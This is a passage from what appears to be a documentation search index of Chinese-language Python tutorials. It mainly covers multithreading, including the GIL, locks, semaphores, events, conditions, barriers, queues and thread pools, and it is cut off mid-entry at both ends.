\u8f83\u9ad8\uff0c\u9700\u8981\u5f02\u6b65\u601d\u7ef4 \u76f8\u5bf9\u7b80\u5355\uff0c\u4f46\u9700\u5904\u7406\u7ebf\u7a0b\u5b89\u5168"},{"location":"python-advanced/coroutines/#_21","title":"\u603b\u7ed3","text":"<p>\u534f\u7a0b\u548c\u5f02\u6b65\u7f16\u7a0b\u662fPython\u4e2d\u5904\u7406I/O\u5bc6\u96c6\u578b\u4efb\u52a1\u7684\u5f3a\u5927\u5de5\u5177\u3002\u901a\u8fc7\u5408\u7406\u4f7f\u7528<code>asyncio</code>\u5e93\u548c<code>async/await</code>\u8bed\u6cd5\uff0c\u53ef\u4ee5\u7f16\u5199\u51fa\u9ad8\u6548\u3001\u54cd\u5e94\u8fc5\u901f\u7684\u5e76\u53d1\u4ee3\u7801\u3002\u4e0e\u591a\u7ebf\u7a0b\u76f8\u6bd4\uff0c\u5f02\u6b65\u7f16\u7a0b\u5728\u5904\u7406\u5927\u91cfI/O\u64cd\u4f5c\u65f6\u5177\u6709\u66f4\u4f4e\u7684\u8d44\u6e90\u6d88\u8017\u548c\u66f4\u9ad8\u7684\u6548\u7387\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5e94\u5f53\u6839\u636e\u4efb\u52a1\u7684\u6027\u8d28\u9009\u62e9\u5408\u9002\u7684\u5e76\u53d1\u7f16\u7a0b\u65b9\u5f0f\uff1a\u5bf9\u4e8eI/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u4f18\u5148\u8003\u8651\u5f02\u6b65\u7f16\u7a0b\uff1b\u5bf9\u4e8eCPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u591a\u8fdb\u7a0b\u6216\u7ed3\u5408\u4f7f\u7528\u5f02\u6b65\u7f16\u7a0b\u548c\u7ebf\u7a0b\u6c60\u3002</p>"},{"location":"python-advanced/multithreading/","title":"Python\u591a\u7ebf\u7a0b\u7f16\u7a0b","text":""},{"location":"python-advanced/multithreading/#_1","title":"\u4ec0\u4e48\u662f\u591a\u7ebf\u7a0b\u7f16\u7a0b\uff1f","text":"<p>\u591a\u7ebf\u7a0b\u7f16\u7a0b\u662f\u4e00\u79cd\u5e76\u53d1\u7f16\u7a0b\u8303\u5f0f\uff0c\u5b83\u5141\u8bb8\u7a0b\u5e8f\u540c\u65f6\u6267\u884c\u591a\u4e2a\u4efb\u52a1\uff08\u7ebf\u7a0b\uff09\uff0c\u4ece\u800c\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u54cd\u5e94\u6027\u3002\u5728Python\u4e2d\uff0c\u7ebf\u7a0b\u662f\u64cd\u4f5c\u7cfb\u7edf\u8c03\u5ea6\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u72ec\u7acb\u6267\u884c\u4e0d\u540c\u7684\u4ee3\u7801\u8def\u5f84\u3002</p> <p>Python\u63d0\u4f9b\u4e86<code>threading</code>\u6a21\u5757\u6765\u652f\u6301\u591a\u7ebf\u7a0b\u7f16\u7a0b\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8eGIL\uff08\u5168\u5c40\u89e3\u91ca\u5668\u9501\uff09\u7684\u5b58\u5728\uff0cPython\u7684\u591a\u7ebf\u7a0b\u5728CPU\u5bc6\u96c6\u578b\u4efb\u52a1\u4e0a\u53ef\u80fd\u4e0d\u4f1a\u5e26\u6765\u6027\u80fd\u63d0\u5347\uff0c\u4f46\u5bf9\u4e8eI/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff08\u5982\u7f51\u7edc\u8bf7\u6c42\u3001\u6587\u4ef6\u64cd\u4f5c\u7b49\uff09\u4ecd\u7136\u975e\u5e38\u6709\u7528\u3002</p>"},{"location":"python-advanced/multithreading/#_2","title":"\u7ebf\u7a0b\u7684\u57fa\u672c\u6982\u5ff5","text":""},{"location":"python-advanced/multithreading/#_3","title":"\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b","text":"<ul> <li>\u8fdb\u7a0b\uff1a\u7a0b\u5e8f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u5b9e\u4f8b\uff0c\u62e5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u7a7a\u95f4</li> <li>\u7ebf\u7a0b\uff1a\u8fdb\u7a0b\u5185\u7684\u6267\u884c\u5355\u5143\uff0c\u5171\u4eab\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4</li> <li>\u591a\u7ebf\u7a0b\uff1a\u5728\u4e00\u4e2a\u8fdb\u7a0b\u5185\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u7ebf\u7a0b\uff0c\u5171\u4eab\u5185\u5b58\u4f46\u6709\u5404\u81ea\u7684\u6267\u884c\u4e0a\u4e0b\u6587</li> </ul>"},{"location":"python-advanced/multithreading/#gil","title":"GIL\uff08\u5168\u5c40\u89e3\u91ca\u5668\u9501\uff09","text":"<p>\u5168\u5c40\u89e3\u91ca\u5668\u9501\uff08Global Interpreter Lock\uff09\u662fPython\u89e3\u91ca\u5668\u4e2d\u7684\u4e00\u4e2a\u673a\u5236\uff0c\u5b83\u786e\u4fdd\u5728\u4efb\u4f55\u65f6\u523b\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884cPython\u5b57\u8282\u7801\u3002\u8fd9\u610f\u5473\u7740\u5373\u4f7f\u5728\u591a\u6838\u5904\u7406\u5668\u4e0a\uff0cPython\u7684\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u4e5f\u65e0\u6cd5\u771f\u6b63\u5b9e\u73b0\u5e76\u884c\u6267\u884cPython\u4ee3\u7801\u3002</p> <p>GIL\u7684\u5b58\u5728\u7b80\u5316\u4e86Python\u89e3\u91ca\u5668\u7684\u5b9e\u73b0\uff0c\u4f46\u4e5f\u9650\u5236\u4e86CPU\u5bc6\u96c6\u578b\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u5bf9\u4e8eI/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u7531\u4e8e\u7ebf\u7a0b\u5728\u7b49\u5f85I/O\u64cd\u4f5c\u65f6\u4f1a\u91ca\u653eGIL\uff0c\u56e0\u6b64\u591a\u7ebf\u7a0b\u4ecd\u7136\u53ef\u4ee5\u63d0\u9ad8\u5e76\u53d1\u6027\u80fd\u3002</p>"},{"location":"python-advanced/multithreading/#threading","title":"\u4f7f\u7528threading\u6a21\u5757\u521b\u5efa\u7ebf\u7a0b","text":""},{"location":"python-advanced/multithreading/#thread","title":"\u65b9\u6cd5\u4e00\uff1a\u4f7f\u7528Thread\u7c7b","text":"<pre><code>import threading\nimport time\n\ndef worker(name):\n    print(f\"Worker {name} started\")\n    time.sleep(2)  # \u6a21\u62df\u5de5\u4f5c\n    print(f\"Worker {name} finished\")\n\n# \u521b\u5efa\u7ebf\u7a0b\nthread1 = threading.Thread(target=worker, args=('A',))\nthread2 = threading.Thread(target=worker, args=('B',))\n\n# \u542f\u52a8\u7ebf\u7a0b\nthread1.start()\nthread2.start()\n\n# \u7b49\u5f85\u7ebf\u7a0b\u5b8c\u6210\nthread1.join()\nthread2.join()\n\nprint(\"All workers finished\")\n</code></pre>"},{"location":"python-advanced/multithreading/#thread_1","title":"\u65b9\u6cd5\u4e8c\uff1a\u7ee7\u627fThread\u7c7b","text":"<pre><code>import threading\nimport time\n\nclass WorkerThread(threading.Thread):\n    def __init__(self, name):\n        super().__init__()\n        self.name = name\n\n    def run(self):\n        print(f\"Worker {self.name} started\")\n        time.sleep(2)  # \u6a21\u62df\u5de5\u4f5c\n        print(f\"Worker {self.name} finished\")\n\n# \u521b\u5efa\u7ebf\u7a0b\u5b9e\u4f8b\nthread1 = WorkerThread('A')\nthread2 = WorkerThread('B')\n\n# \u542f\u52a8\u7ebf\u7a0b\nthread1.start()\nthread2.start()\n\n# \u7b49\u5f85\u7ebf\u7a0b\u5b8c\u6210\nthread1.join()\nthread2.join()\n\nprint(\"All workers finished\")\n</code></pre>"},{"location":"python-advanced/multithreading/#_4","title":"\u65b9\u6cd5\u4e09\uff1a\u4f7f\u7528\u7ebf\u7a0b\u6c60","text":"<p>\u5bf9\u4e8e\u9700\u8981\u521b\u5efa\u548c\u7ba1\u7406\u5927\u91cf\u7ebf\u7a0b\u7684\u573a\u666f\uff0c\u4f7f\u7528\u7ebf\u7a0b\u6c60\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u7ba1\u7406\u7ebf\u7a0b\u8d44\u6e90\uff1a</p> <pre><code>import concurrent.futures\nimport time\n\ndef worker(name):\n    print(f\"Worker {name} started\")\n    time.sleep(2)  # \u6a21\u62df\u5de5\u4f5c\n    print(f\"Worker {name} finished\")\n    return f\"Result from {name}\"\n\n# \u521b\u5efa\u7ebf\u7a0b\u6c60\uff0c\u6700\u591a\u540c\u65f6\u6267\u884c3\u4e2a\u7ebf\u7a0b\nwith concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:\n    # \u63d0\u4ea4\u4efb\u52a1\u5230\u7ebf\u7a0b\u6c60\n    future_to_name = {executor.submit(worker, i): i for i in range(5)}\n\n    # \u6536\u96c6\u7ed3\u679c\n    for future in concurrent.futures.as_completed(future_to_name):\n        name = future_to_name[future]\n        try:\n            result = future.result()\n            print(f\"{name} result: {result}\")\n        except Exception as e:\n            print(f\"{name} generated an exception: {e}\")\n\nprint(\"All workers finished\")\n</code></pre>"},{"location":"python-advanced/multithreading/#_5","title":"\u7ebf\u7a0b\u540c\u6b65","text":"<p>\u5728\u591a\u7ebf\u7a0b\u73af\u5883\u4e2d\uff0c\u5f53\u591a\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u5171\u4eab\u8d44\u6e90\u65f6\uff0c\u9700\u8981\u786e\u4fdd\u6570\u636e\u7684\u4e00\u81f4\u6027\u548c\u6b63\u786e\u6027\u3002Python\u63d0\u4f9b\u4e86\u591a\u79cd\u7ebf\u7a0b\u540c\u6b65\u673a\u5236\u3002</p>"},{"location":"python-advanced/multithreading/#lock","title":"Lock\uff08\u9501\uff09","text":"<p>Lock\u662f\u6700\u7b80\u5355\u7684\u7ebf\u7a0b\u540c\u6b65\u673a\u5236\uff0c\u5b83\u63d0\u4f9b\u4e86<code>acquire()</code>\u548c<code>release()</code>\u65b9\u6cd5\u6765\u63a7\u5236\u5bf9\u5171\u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\uff1a</p> <pre><code>import threading\nimport time\n\ncounter = 0\nlock = threading.Lock()\n\ndef increment():\n    global counter\n    for _ in range(100000):\n        # \u83b7\u53d6\u9501\n        with lock:  # \u81ea\u52a8\u8c03\u7528acquire()\u548crelease()\n            counter += 1\n\n# \u521b\u5efa\u7ebf\u7a0b\nthreads = []\nfor _ in range(10):\n    thread = threading.Thread(target=increment)\n    threads.append(thread)\n    thread.start()\n\n# \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5b8c\u6210\nfor thread in threads:\n    thread.join()\n\nprint(f\"Final counter value: {counter}\")  # \u5e94\u8be5\u662f1000000\n</code></pre>"},{"location":"python-advanced/multithreading/#rlock","title":"RLock\uff08\u53ef\u91cd\u5165\u9501\uff09","text":"<p>RLock\u5141\u8bb8\u540c\u4e00\u7ebf\u7a0b\u591a\u6b21\u83b7\u53d6\u9501\uff0c\u9002\u7528\u4e8e\u9012\u5f52\u51fd\u6570\u6216\u65b9\u6cd5\uff1a</p> <pre><code>import threading\n\nrlock = threading.RLock()\n\ndef recursive_function(n):\n    with rlock:\n        print(f\"Level {n}\")\n        if n &gt; 0:\n            recursive_function(n - 1)\n\nrecursive_function(3)\n</code></pre>"},{"location":"python-advanced/multithreading/#semaphore","title":"Semaphore\uff08\u4fe1\u53f7\u91cf\uff09","text":"<p>Semaphore\u9650\u5236\u540c\u65f6\u8bbf\u95ee\u8d44\u6e90\u7684\u7ebf\u7a0b\u6570\u91cf\uff1a</p> <pre><code>import threading\nimport time\n\n# \u521b\u5efa\u4fe1\u53f7\u91cf\uff0c\u6700\u591a\u5141\u8bb83\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bbf\u95ee\nsemaphore = threading.Semaphore(3)\n\ndef worker(name):\n    print(f\"Worker {name} waiting\")\n    # \u83b7\u53d6\u4fe1\u53f7\u91cf\n    semaphore.acquire()\n    print(f\"Worker {name} acquired semaphore\")\n    time.sleep(2)  # \u6a21\u62df\u5de5\u4f5c\n    print(f\"Worker {name} releasing semaphore\")\n    # \u91ca\u653e\u4fe1\u53f7\u91cf\n    semaphore.release()\n\n# \u521b\u5efa10\u4e2a\u7ebf\u7a0b\nthreads = []\nfor i in range(10):\n    thread = threading.Thread(target=worker, args=(i,))\n    threads.append(thread)\n    thread.start()\n\n# \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5b8c\u6210\nfor thread in threads:\n    thread.join()\n\nprint(\"All workers finished\")\n</code></pre>"},{"location":"python-advanced/multithreading/#event","title":"Event\uff08\u4e8b\u4ef6\uff09","text":"<p>Event\u7528\u4e8e\u7ebf\u7a0b\u95f4\u7684\u7b80\u5355\u901a\u77e5\u673a\u5236\uff1a</p> <pre><code>import threading\nimport time\n\n# \u521b\u5efa\u4e8b\u4ef6\u5bf9\u8c61\nstart_event = threading.Event()\n\ndef worker(name):\n    print(f\"Worker {name} waiting for signal\")\n    # \u7b49\u5f85\u4e8b\u4ef6\u88ab\u8bbe\u7f6e\n    start_event.wait()\n    print(f\"Worker {name} started working\")\n    time.sleep(2)\n    print(f\"Worker {name} finished\")\n\n# \u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\nthreads = []\nfor i in range(5):\n    thread = threading.Thread(target=worker, args=(i,))\n    threads.append(thread)\n    thread.start()\n\n# \u4e3b\u7ebf\u7a0b\u5ef6\u8fdf\u540e\u8bbe\u7f6e\u4e8b\u4ef6\ntime.sleep(3)\nprint(\"Setting start event\")\nstart_event.set()\n\n# \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5b8c\u6210\nfor thread in threads:\n    thread.join()\n\nprint(\"All workers finished\")\n</code></pre>"},{"location":"python-advanced/multithreading/#condition","title":"Condition\uff08\u6761\u4ef6\u53d8\u91cf\uff09","text":"<p>Condition\u7528\u4e8e\u7ebf\u7a0b\u95f4\u7684\u590d\u6742\u540c\u6b65\uff0c\u5141\u8bb8\u7ebf\u7a0b\u7b49\u5f85\u7279\u5b9a\u6761\u4ef6\u6210\u7acb\uff1a</p> <pre><code>import threading\nimport time\n\n# \u521b\u5efa\u6761\u4ef6\u53d8\u91cf\ncondition = threading.Condition()\nqueue = []\nMAX_ITEMS = 5\n\ndef producer():\n    for i in range(10):\n        with condition:\n            # \u7b49\u5f85\u961f\u5217\u6709\u7a7a\u95f4\n            while len(queue) &gt;= MAX_ITEMS:\n                print(f\"Queue full, producer waiting\")\n                condition.wait()  # \u91ca\u653e\u9501\u5e76\u7b49\u5f85\n\n            # \u6dfb\u52a0\u9879\u76ee\u5230\u961f\u5217\n            item = f\"item-{i}\"\n            queue.append(item)\n            print(f\"Produced {item}, queue: {queue}\")\n\n            # \u901a\u77e5\u7b49\u5f85\u7684\u6d88\u8d39\u8005\n            condition.notify_all()\n\n        time.sleep(0.5)  # \u751f\u4ea7\u95f4\u9694\n\ndef consumer(name):\n    for _ in range(3):  # \u6bcf\u4e2a\u6d88\u8d39\u8005\u6d88\u8d393\u4e2a\u9879\u76ee\n        with condition:\n            # \u7b49\u5f85\u961f\u5217\u6709\u9879\u76ee\n            while len(queue) == 0:\n                print(f\"Queue empty, consumer {name} waiting\")\n                condition.wait()  # \u91ca\u653e\u9501\u5e76\u7b49\u5f85\n\n            # \u4ece\u961f\u5217\u53d6\u51fa\u9879\u76ee\n            item = queue.pop(0)\n            print(f\"Consumer {name} consumed {item}, queue: {queue}\")\n\n            # \u901a\u77e5\u7b49\u5f85\u7684\u751f\u4ea7\u8005\n            condition.notify_all()\n\n        time.sleep(1)  # \u6d88\u8d39\u95f4\u9694\n\n# \u521b\u5efa\u751f\u4ea7\u8005\u548c\u6d88\u8d39\u8005\u7ebf\u7a0b\nproducer_thread = threading.Thread(target=producer)\nconsumer_threads = [threading.Thread(target=consumer, args=(i,)) for i in range(3)]\n\n# \u542f\u52a8\u6240\u6709\u7ebf\u7a0b\nproducer_thread.start()\nfor thread in consumer_threads:\n    thread.start()\n\n# \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5b8c\u6210\nproducer_thread.join()\nfor thread in consumer_threads:\n    thread.join()\n\nprint(\"All threads finished\")\n</code></pre>"},{"location":"python-advanced/multithreading/#barrier","title":"Barrier\uff08\u6805\u680f\uff09","text":"<p>Barrier\u7528\u4e8e\u7b49\u5f85\u4e00\u7ec4\u7ebf\u7a0b\u5230\u8fbe\u4e00\u4e2a\u5171\u540c\u70b9\uff1a</p> <pre><code>import threading\nimport time\nimport random\n\n# \u521b\u5efa\u6805\u680f\uff0c\u7b49\u5f855\u4e2a\u7ebf\u7a0b\nbarrier = threading.Barrier(5)\n\ndef worker(name):\n    sleep_time = random.randint(1, 5)\n    print(f\"Worker {name} working for {sleep_time} seconds\")\n    time.sleep(sleep_time)\n    print(f\"Worker {name} reached the barrier\")\n\n    # \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5230\u8fbe\u6805\u680f\n    barrier.wait()\n\n    print(f\"Worker {name} passed the barrier\")\n\n# \u521b\u5efa5\u4e2a\u7ebf\u7a0b\nthreads = []\nfor i in range(5):\n    thread = threading.Thread(target=worker, args=(i,))\n    threads.append(thread)\n    thread.start()\n\n# \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5b8c\u6210\nfor thread in threads:\n    thread.join()\n\nprint(\"All workers passed the barrier\")\n</code></pre>"},{"location":"python-advanced/multithreading/#_6","title":"\u7ebf\u7a0b\u901a\u4fe1","text":""},{"location":"python-advanced/multithreading/#_7","title":"\u4f7f\u7528\u5171\u4eab\u53d8\u91cf","text":"<p>\u901a\u8fc7\u5171\u4eab\u53d8\u91cf\u8fdb\u884c\u7ebf\u7a0b\u95f4\u901a\u4fe1\uff0c\u4f46\u9700\u8981\u4f7f\u7528\u9501\u7b49\u540c\u6b65\u673a\u5236\u786e\u4fdd\u6570\u636e\u4e00\u81f4\u6027\uff1a</p> <pre><code>import threading\n\nshared_data = []\nlock = threading.Lock()\n\ndef producer():\n    for i in range(10):\n        with lock:\n            shared_data.append(i)\n            print(f\"Produced: {i}\")\n\ndef consumer():\n    while len(shared_data) &lt; 10:\n        with lock:\n            if shared_data:\n                item = shared_data.pop(0)\n                print(f\"Consumed: {item}\")\n\n# \u521b\u5efa\u7ebf\u7a0b\nproducer_thread = threading.Thread(target=producer)\nconsumer_thread = threading.Thread(target=consumer)\n\n# \u542f\u52a8\u7ebf\u7a0b\nproducer_thread.start()\nconsumer_thread.start()\n\n# \u7b49\u5f85\u7ebf\u7a0b\u5b8c\u6210\nproducer_thread.join()\nconsumer_thread.join()\n\n# \u6d88\u8d39\u5269\u4f59\u7684\u9879\u76ee\nwith lock:\n    while shared_data:\n        item = shared_data.pop(0)\n        print(f\"Final consumed: {item}\")\n</code></pre>"},{"location":"python-advanced/multithreading/#queue","title":"\u4f7f\u7528Queue\uff08\u961f\u5217\uff09","text":"<p>Queue\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u6570\u636e\u7ed3\u6784\uff0c\u975e\u5e38\u9002\u5408\u7ebf\u7a0b\u95f4\u901a\u4fe1\uff1a</p> <pre><code>import threading\nimport queue\nimport time\n\n# \u521b\u5efa\u961f\u5217\nq = queue.Queue()\n\ndef producer():\n    for i in range(10):\n        item = f\"item-{i}\"\n        q.put(item)\n        print(f\"Produced: {item}\")\n        time.sleep(0.5)  # \u751f\u4ea7\u95f4\u9694\n\ndef consumer():\n    while True:\n        try:\n            # \u4ece\u961f\u5217\u83b7\u53d6\u9879\u76ee\uff0c\u8bbe\u7f6e\u8d85\u65f6\n            item = q.get(timeout=2)\n            print(f\"Consumed: {item}\")\n            q.task_done()  # \u6807\u8bb0\u4efb\u52a1\u5b8c\u6210\n            time.sleep(1)  # \u6d88\u8d39\u95f4\u9694\n        except queue.Empty:\n            # \u961f\u5217\u4e3a\u7a7a\u4e14\u8d85\u65f6\uff0c\u9000\u51fa\u5faa\u73af\n            if not threading.main_thread().is_alive():\n                break\n\n# \u521b\u5efa\u7ebf\u7a0b\nproducer_thread = threading.Thread(target=producer)\nconsumer_thread = threading.Thread(target=consumer)\n\n# \u542f\u52a8\u7ebf\u7a0b\nproducer_thread.start()\nconsumer_thread.start()\n\n# \u7b49\u5f85\u751f\u4ea7\u8005\u5b8c\u6210\nproducer_thread.join()\n\n# \u7b49\u5f85\u961f\u5217\u4e2d\u7684\u6240\u6709\u4efb\u52a1\u5b8c\u6210\nq.join()\n\nprint(\"All items processed\")\n</code></pre>"},{"location":"python-advanced/multithreading/#_8","title":"\u7ebf\u7a0b\u6c60","text":"<p>\u7ebf\u7a0b\u6c60\u662f\u7ba1\u7406\u591a\u4e2a\u7ebf\u7a0b\u7684\u5bb9\u5668\uff0c\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u521b\u5efa\u548c\u9500\u6bc1\u7ebf\u7a0b\u7684\u5f00\u9500\uff1a</p>"},{"location":"python-advanced/multithreading/#concurrentfuturesthreadpoolexecutor","title":"concurrent.futures.ThreadPoolExecutor","text":"<pre><code>import concurrent.futures\nimport time\nimport random\n\ndef task(task_id):\n    sleep_time = random.uniform(0.5, 2.0)\n    print(f\"Task {task_id} started, will sleep for {sleep_time:.2f} seconds\")\n    time.sleep(sleep_time)\n    print(f\"Task {task_id} completed\")\n    return f\"Result of task {task_id}\"\n\n# \u521b\u5efa\u7ebf\u7a0b\u6c60\uff0c\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a3\nwith concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:\n    # \u63d0\u4ea4\u4efb\u52a1\u5230\u7ebf\u7a0b\u6c60\n    futures = [executor.submit(task, i) for i in range(10)]\n\n    # \u65b9\u6cd51\uff1a\u7b49\u5f85\u6240\u6709\u4efb\u52a1\u5b8c\u6210\u5e76\u83b7\u53d6\u7ed3\u679c\n    for future in concurrent.futures.as_completed(futures):\n        try:\n            result = future.result()\n            print(f\"Got result: {result}\")\n        except Exception as e:\n            print(f\"Task generated an exception: {e}\")\n\n    # \u65b9\u6cd52\uff1a\u6620\u5c04\u51fd\u6570\u5230\u591a\u4e2a\u53c2\u6570\n    # results = list(executor.map(task, range(10)))\n    # for result in results:\n    #     print(f\"Got result: {result}\")\n</code></pre>"},{"location":"python-advanced/multithreading/#_9","title":"\u7ebf\u7a0b\u5b89\u5168\u95ee\u9898\u4e0e\u89e3\u51b3\u65b9\u6848","text":""},{"location":"python-advanced/multithreading/#_10","title":"\u5e38\u89c1\u7684\u7ebf\u7a0b\u5b89\u5168\u95ee\u9898","text":"<ol> <li>\u7ade\u6001\u6761\u4ef6\uff1a\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bbf\u95ee\u548c\u4fee\u6539\u5171\u4eab\u6570\u636e\uff0c\u5bfc\u81f4\u6570\u636e\u4e0d\u4e00\u81f4</li> <li>\u6b7b\u9501\uff1a\u4e24\u4e2a\u6216\u591a\u4e2a\u7ebf\u7a0b\u4e92\u76f8\u7b49\u5f85\u5bf9\u65b9\u91ca\u653e\u8d44\u6e90\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u5361\u6b7b</li> <li>\u6d3b\u9501\uff1a\u7ebf\u7a0b\u4e0d\u65ad\u5c1d\u8bd5\u89e3\u51b3\u51b2\u7a81\uff0c\u4f46\u59cb\u7ec8\u65e0\u6cd5\u53d6\u5f97\u8fdb\u5c55</li> <li>\u8d44\u6e90\u6cc4\u9732\uff1a\u7ebf\u7a0b\u672a\u6b63\u786e\u91ca\u653e\u8d44\u6e90\uff0c\u5bfc\u81f4\u8d44\u6e90\u8017\u5c3d</li> </ol>"},{"location":"python-advanced/multithreading/#_11","title":"\u89e3\u51b3\u65b9\u6848","text":"<ol> <li>\u4f7f\u7528\u7ebf\u7a0b\u5b89\u5168\u7684\u6570\u636e\u7ed3\u6784\uff1a\u5982<code>queue.Queue</code></li> <li>\u6b63\u786e\u4f7f\u7528\u540c\u6b65\u539f\u8bed\uff1a\u9501\u3001\u6761\u4ef6\u53d8\u91cf\u7b49</li> <li>\u907f\u514d\u5d4c\u5957\u9501\uff1a\u51cf\u5c11\u6b7b\u9501\u98ce\u9669</li> <li>\u8bbe\u7f6e\u9501\u8d85\u65f6\uff1a\u907f\u514d\u6c38\u4e45\u7b49\u5f85</li> <li>\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff1a\u786e\u4fdd\u9501\u7684\u6b63\u786e\u83b7\u53d6\u548c\u91ca\u653e</li> </ol> <pre><code># \u907f\u514d\u6b7b\u9501\u7684\u793a\u4f8b\uff1a\u6309\u56fa\u5b9a\u987a\u5e8f\u83b7\u53d6\u9501\nlock_a = threading.Lock()\nlock_b = threading.Lock()\n\ndef safe_function1():\n    # \u5148\u83b7\u53d6lock_a\uff0c\u518d\u83b7\u53d6lock_b\n    with lock_a:\n        with lock_b:\n            print(\"Function 1 critical section\")\n\ndef safe_function2():\n    # \u540c\u6837\u5148\u83b7\u53d6lock_a\uff0c\u518d\u83b7\u53d6lock_b\n    with lock_a:\n        with lock_b:\n            print(\"Function 2 critical section\")\n</code></pre>"},{"location":"python-advanced/multithreading/#_12","title":"\u591a\u7ebf\u7a0b\u7f16\u7a0b\u7684\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u907f\u514d\u5171\u4eab\u72b6\u6001\uff1a\u5c3d\u91cf\u51cf\u5c11\u7ebf\u7a0b\u95f4\u5171\u4eab\u6570\u636e</li> <li>\u4f7f\u7528\u4e0d\u53ef\u53d8\u6570\u636e\uff1a\u51cf\u5c11\u540c\u6b65\u9700\u6c42</li> <li>\u4f7f\u7528\u7ebf\u7a0b\u5b89\u5168\u7684\u5e93\uff1a\u5982<code>queue</code>\u3001<code>threading</code>\u7b49</li> <li>\u6ce8\u610fGIL\u7684\u5f71\u54cd\uff1aCPU\u5bc6\u96c6\u578b\u4efb\u52a1\u8003\u8651\u4f7f\u7528\u591a\u8fdb\u7a0b</li> <li>\u5408\u7406\u8bbe\u7f6e\u7ebf\u7a0b\u6570\u91cf\uff1a\u907f\u514d\u521b\u5efa\u8fc7\u591a\u7ebf\u7a0b</li> <li>\u6b63\u786e\u5904\u7406\u5f02\u5e38\uff1a\u5728\u7ebf\u7a0b\u4e2d\u6355\u83b7\u548c\u5904\u7406\u5f02\u5e38</li> <li>\u4f7f\u7528\u5b88\u62a4\u7ebf\u7a0b\uff1a\u5bf9\u4e8e\u4e0d\u9700\u8981\u7b49\u5f85\u5b8c\u6210\u7684\u7ebf\u7a0b</li> </ol> <pre><code>import threading\nimport time\n\ndef background_task():\n    try:\n        while True:\n            print(\"Running background task\")\n            time.sleep(1)\n    except Exception as e:\n        print(f\"Background task exception: {e}\")\n\n# \u521b\u5efa\u5b88\u62a4\u7ebf\u7a0b\nbg_thread = threading.Thread(target=background_task, daemon=True)\nbg_thread.start()\n\n# \u4e3b\u7ebf\u7a0b\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u9000\u51fa\ntime.sleep(5)\nprint(\"Main thread exiting\")\n# \u5b88\u62a4\u7ebf\u7a0b\u4f1a\u968f\u7740\u4e3b\u7ebf\u7a0b\u9000\u51fa\u800c\u7ec8\u6b62\n</code></pre>"},{"location":"python-advanced/multithreading/#_13","title":"\u603b\u7ed3","text":"<p>\u591a\u7ebf\u7a0b\u7f16\u7a0b\u662fPython\u4e2d\u5b9e\u73b0\u5e76\u53d1\u7684\u91cd\u8981\u65b9\u5f0f\uff0c\u7279\u522b\u9002\u7528\u4e8eI/O\u5bc6\u96c6\u578b\u4efb\u52a1\u3002\u901a\u8fc7\u5408\u7406\u4f7f\u7528<code>threading</code>\u6a21\u5757\u63d0\u4f9b\u7684\u5404\u79cd\u540c\u6b65\u539f\u8bed\u548c\u7ebf\u7a0b\u5b89\u5168\u7684\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u89e3\u51b3\u591a\u7ebf\u7a0b\u7f16\u7a0b\u4e2d\u7684\u5404\u79cd\u95ee\u9898\u3002\u7136\u800c\uff0c\u7531\u4e8eGIL\u7684\u5b58\u5728\uff0c\u5bf9\u4e8eCPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u53ef\u80fd\u9700\u8981\u8003\u8651\u4f7f\u7528\u591a\u8fdb\u7a0b\u7f16\u7a0b\uff08\u5982<code>multiprocessing</code>\u6a21\u5757\uff09\u6765\u5145\u5206\u5229\u7528\u591a\u6838\u5904\u7406\u5668\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5e94\u5f53\u6839\u636e\u4efb\u52a1\u7684\u6027\u8d28\u548c\u9700\u6c42\uff0c\u9009\u62e9\u5408\u9002\u7684\u5e76\u53d1\u7f16\u7a0b\u65b9\u5f0f\u3002</p>"},{"location":"python-advanced/oop/","title":"Python\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b","text":""},{"location":"python-advanced/oop/#_1","title":"\u4ec0\u4e48\u662f\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\uff1f","text":"<p>\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\uff08Object-Oriented 